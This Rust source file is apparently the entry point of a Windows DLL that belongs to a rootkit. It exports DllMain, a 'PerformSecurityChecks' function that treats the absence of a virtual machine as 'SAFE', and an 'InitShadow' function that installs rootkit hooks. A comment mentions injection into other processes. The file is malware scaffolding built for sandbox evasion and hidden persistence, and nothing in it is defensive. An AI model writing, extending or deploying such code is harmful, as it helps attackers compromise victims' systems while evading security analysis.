use std::sync::Once;
use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID, TRUE};
use winapi::um::winnt::DLL_PROCESS_ATTACH;

mod vm_detect;
mod rootkit;

#[no_mangle]
pub extern "system" fn DllMain(
    _dll_module: HINSTANCE,
    call_reason: DWORD,
    _reserved: LPVOID,
) -> BOOL {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            // Optional: Auto-initialize if injected via traditional methods
            // rootkit::install_hooks();
        }
        _ => {}
    }
    TRUE
}

/// Helper function to be called from C# to verify environment
#[no_mangle]
pub extern "C" fn PerformSecurityChecks() -> bool {
    // Returns true if SAFE (no VM detected), false if UNSAFE
    if vm_detect::is_vm() {
        return false;
    }
    true
}

/// Helper function to activate the rootkit
#[no_mangle]
pub extern "C" fn InitShadow() -> bool {
    match rootkit::install_hooks() {
        Ok(_) => true,
        Err(_) => false,
    }
}
